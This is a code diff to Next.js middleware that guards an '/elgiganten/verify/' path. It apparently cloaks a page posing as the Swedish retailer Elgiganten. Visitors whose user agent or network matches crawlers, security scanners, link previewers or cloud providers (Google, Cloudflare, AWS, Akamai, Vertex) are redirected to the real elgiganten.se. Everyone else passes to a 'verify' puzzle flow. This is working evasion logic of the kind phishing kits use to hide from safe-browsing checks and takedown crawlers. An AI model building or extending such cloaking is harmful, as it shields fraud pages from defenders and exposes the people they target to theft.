@@ -6,7 +6,12 @@ export const config = {
   matcher: ["/elgiganten/verify/:path*"],
 };
 
-// --- Provider blocklists (ASN + name/domain snippets) ---
+/* ========= RUNTIME CONFIG / LOGGING ========= */
+const REDIRECT_URL = "https://www.elgiganten.se";
+const VERBOSE = process.env.MW_VERBOSE_LOGS !== "0"; // set MW_VERBOSE_LOGS=0 to silence
+const log = (...args: any[]) => VERBOSE && console.log("[MW]", ...args);
+
+/* ========= Provider blocklists (ASN + name/domain snippets) ========= */
 const BAD_ASN = new Set<string>([
   // Google
   "AS15169", "AS396982",
@@ -22,12 +27,12 @@ const BAD_ASN = new Set<string>([
   "AS54113",
   // Akamai
   "AS20940",
-  
-  // >>> Your ISP (for testing)
 
+  // >>> Your ISP (for testing) — uncomment if you want to block via ASN as well
+  // "AS8708",
 ]);
 
-const BAD_NAME_SNIPPETS = [
+const BAD_NAME_SNIPPETS: string[] = [
   "google", "google llc", "google cloud", "googlebot",
   "cloudflare", "cloudflare, inc",
   "amazon", "aws", "amazon.com", "amazon technologies",
@@ -37,16 +42,36 @@ const BAD_NAME_SNIPPETS = [
   "akamai",
 
   // (optional) extra names for your ISP
-  "digi romania", "rdsnet", "rcs & rds", "digi"
+  "digi romania", "rdsnet", "rcs & rds", "digi",
 ];
 
-// --- Broad bot/crawler UA detection (incl. Vertex) ---
+/* ======= Optional ENV-driven extensions (no redeploy code changes) ======= */
+// Comma-separated lists are supported, e.g. "AS15169,AS16509"
+if (process.env.BLOCKED_ASNS) {
+  for (const asn of process.env.BLOCKED_ASNS.split(",")) {
+    const v = asn.trim().toUpperCase();
+    if (v) BAD_ASN.add(v);
+  }
+}
+if (process.env.BLOCKED_ISP_SUBSTRS) {
+  for (const s of process.env.BLOCKED_ISP_SUBSTRS.split(",")) {
+    const v = s.trim().toLowerCase();
+    if (v) BAD_NAME_SNIPPETS.push(v);
+  }
+}
+// Optional country blocks (two-letter codes, e.g. "A1,A2" for Unknown / Satellite)
+const BAD_COUNTRIES = new Set<string>(
+  (process.env.BLOCKED_COUNTRY_CODES || "")
+    .split(",")
+    .map((c) => c.trim().toUpperCase())
+    .filter(Boolean),
+);
+
+/* ========= Broad bot/crawler UA detection (incl. Vertex) ========= */
 const BOT_UA =
   /(bot|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;
 
-const REDIRECT_URL = "https://www.elgiganten.se";
-
-// --- Helpers ---
+/* ========= Helpers ========= */
 function getClientIp(req: NextRequest): string | null {
   // Respect proxies/CDN headers (Vercel/CF)
   const fwd = req.headers.get("x-forwarded-for");
@@ -62,22 +87,32 @@ function getClientIp(req: NextRequest): string | null {
 }
 
 async function ipinfoLookup(ip: string, token?: string) {
-  if (!token) return null;
+  if (!token) {
+    log("No IPINFO_TOKEN; skipping IPinfo.");
+    return null;
+  }
   const url = `https://api.ipinfo.io/lite/${encodeURIComponent(ip)}?token=${encodeURIComponent(token)}`;
   const controller = new AbortController();
   const to = setTimeout(() => controller.abort(), 1200);
   try {
+    log("IPinfo query:", ip);
     const res = await fetch(url, { signal: controller.signal, cache: "no-store" });
     clearTimeout(to);
-    if (!res.ok) return null;
-    // IPinfo Lite returns at least ASN on many IPs; when present, we use it.
-    return (await res.json()) as {
+    if (!res.ok) {
+      log("IPinfo non-OK:", res.status, res.statusText);
+      return null;
+    }
+    const json = (await res.json()) as {
       asn?: string;
       as_name?: string;
       as_domain?: string;
+      country?: string; // sometimes present
     };
-  } catch {
+    log("IPinfo response:", json);
+    return json;
+  } catch (e) {
     clearTimeout(to);
+    log("IPinfo error:", e);
     return null;
   }
 }
@@ -85,10 +120,19 @@ async function ipinfoLookup(ip: string, token?: string) {
 function matchesBadProviderLite(rec: { asn?: string; as_name?: string; as_domain?: string } | null) {
   if (!rec) return false;
   const { asn, as_name, as_domain } = rec;
-  if (asn && BAD_ASN.has(asn.toUpperCase())) return true;
+
+  if (asn && BAD_ASN.has(asn.toUpperCase())) {
+    log("Block by ASN:", asn);
+    return true;
+  }
   const name = (as_name || "").toLowerCase();
   const domain = (as_domain || "").toLowerCase();
-  return BAD_NAME_SNIPPETS.some((n) => name.includes(n) || domain.includes(n));
+  const hit = BAD_NAME_SNIPPETS.find((n) => name.includes(n) || domain.includes(n));
+  if (hit) {
+    log(`Block by ISP substring: "${hit}" in name="${name}" domain="${domain}"`);
+    return true;
+  }
+  return false;
 }
 
 async function maxmindLookup(req: NextRequest, ip: string) {
@@ -98,6 +142,7 @@ async function maxmindLookup(req: NextRequest, ip: string) {
   try {
     const url = new URL("/api/isp-lookup", req.nextUrl.origin);
     url.searchParams.set("ip", ip);
+    log("MaxMind check:", url.toString());
     const res = await fetch(url.toString(), {
       method: "GET",
       signal: controller.signal,
@@ -105,37 +150,58 @@ async function maxmindLookup(req: NextRequest, ip: string) {
       cache: "no-store",
     });
     clearTimeout(to);
-    if (!res.ok) return null;
-    return (await res.json()) as { isBad?: boolean };
-  } catch {
+    if (!res.ok) {
+      log("MaxMind non-OK:", res.status);
+      return null;
+    }
+    const json = (await res.json()) as { isBad?: boolean; reason?: string; isp?: string; asn?: string };
+    log("MaxMind response:", json);
+    return json;
+  } catch (e) {
     clearTimeout(to);
+    log("MaxMind error:", e);
     return null;
   }
 }
 
-// --- Middleware entrypoint (Edge runtime) ---
+/* ========= Middleware entrypoint (Edge runtime) ========= */
 export async function middleware(req: NextRequest) {
-  // 0) UA block (bots and previews) **before** any page logic
   const ua = req.headers.get("user-agent") || "";
+  const ip = getClientIp(req);
+  log("— MW START —", { path: req.nextUrl.pathname, ip, ua });
+
+  // 0) UA block (bots and previews) **before** any page logic
   if (BOT_UA.test(ua)) {
+    log("Block by UA bot signature");
     return NextResponse.redirect(REDIRECT_URL, { status: 302 });
   }
 
-  // 1) IPinfo ASN/AS-name/domain check
-  const ip = getClientIp(req);
+  // 1) IPinfo ASN/AS-name/domain (+ optional country)
   if (ip) {
     const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
-    if (matchesBadProviderLite(lite)) {
+
+    // Country block (if provided by IPinfo Lite & configured)
+    if (lite?.country && BAD_COUNTRIES.has(lite.country.toUpperCase())) {
+      log("Block by country code:", lite.country);
       return NextResponse.redirect(REDIRECT_URL, { status: 302 });
     }
 
-    // 2) MaxMind ISP DB as a second signal
-    const mm = await maxmindLookup(req, ip);
-    if (mm?.isBad) {
+    if (matchesBadProviderLite(lite)) {
+      log("Redirect (IPinfo match) →", REDIRECT_URL);
       return NextResponse.redirect(REDIRECT_URL, { status: 302 });
     }
+
+    // 2) MaxMind ISP DB as a second signal (if you wired /api/isp-lookup)
+    const mm = await maxmindLookup(req, ip);
+    if (mm?.isBad) {
+      log("Redirect (MaxMind match) →", REDIRECT_URL);
+      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
+    }
+  } else {
+    log("No client IP found; skipping IP-based checks");
   }
 
   // 3) Allow through to the verify page flow (puzzle etc.)
+  log("Allow through");
   return NextResponse.next();
 }
